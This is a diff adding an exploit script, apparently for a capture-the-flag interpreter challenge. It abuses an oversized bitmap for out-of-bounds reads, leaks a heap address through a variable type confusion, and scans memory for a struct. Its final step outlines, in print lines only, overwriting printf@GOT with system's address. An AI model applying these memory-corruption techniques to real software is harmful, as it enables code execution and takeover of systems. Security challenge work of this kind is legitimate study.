@@ -1,0 +1,48 @@
+print("=== Find Bitmap Buffer via OOB Read ===");
+
+print("Step 1: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 2: Leak heap address");
+int marker = 0;
+string marker = "marker";
+int heapmarker = marker;
+print("Heap marker:");
+print(heapmarker);
+
+print("Step 3: Scan for bitmap struct");
+print("Bitmap struct is 0x18 bytes:");
+print("  offset 0x00: width (8 bytes) = INT64_MAX");
+print("  offset 0x08: height (8 bytes) = 2");
+print("  offset 0x10: data_ptr (8 bytes) = bitmap buffer address");
+
+print("Scanning memory around heap marker...");
+print("Looking for width=INT64_MAX pattern");
+
+int i = 0;
+int found = 0;
+while (i < 2000) {
+    int bit0 = get(b1, i * 8 + 0, 0);
+    int bit1 = get(b1, i * 8 + 1, 0);
+    int bit2 = get(b1, i * 8 + 2, 0);
+    int bit3 = get(b1, i * 8 + 3, 0);
+    
+    if (bit0 != 0 || bit1 != 0 || bit2 != 0 || bit3 != 0) {
+        print("Non-zero at byte offset:");
+        print(i);
+        found = 1;
+    }
+    
+    i = i + 1;
+}
+
+if (found == 0) {
+    print("No bitmap struct found in scanned range");
+    print("Bitmap struct might be elsewhere");
+}
+
+print("Step 4: Alternative approach");
+print("Use variable corruption to write to GOT");
+print("Corrupt variable.value_ptr to printf@GOT");
+print("Then write system_addr through that variable");
+
